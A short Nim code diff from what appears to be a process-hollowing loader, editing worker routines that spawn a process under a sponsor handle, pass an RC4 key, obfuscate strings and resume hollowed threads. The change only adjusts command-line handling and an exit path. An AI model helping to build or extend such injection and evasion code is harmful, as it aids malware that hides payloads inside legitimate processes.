@@ -289,7 +289,7 @@ when defined(hollow5) or defined(hollow6):
    
 proc createProcessWorker(arg: string, sponsorHandle: HANDLE): PPROCESS_INFORMATION =
 
-    var processCmd = getAppFilename() & arg
+    var processCmd = ($GetCommandLineA()).replace(" -M", "") & arg
     
     # Supply RC4 key if needed
     for i in commandLineParams():
@@ -404,7 +404,7 @@ proc hollow456Worker*(peStr: string): bool =
     
     # Extract process parameters
     let commandLineParams = commandLineParams()
-    
+
     # Parse command line args and call to worker functions
     var newImageBase: PVOID
     for i in commandLineParams:
@@ -437,5 +437,6 @@ proc hollow456Worker*(peStr: string): bool =
             resumeThreadProcess(
                 parseInt(i.replace(protectString("-R:"), ""))
             )
-        else:
-            quit(1)
+    
+    # No parameter matched known worker    
+    quit(1)
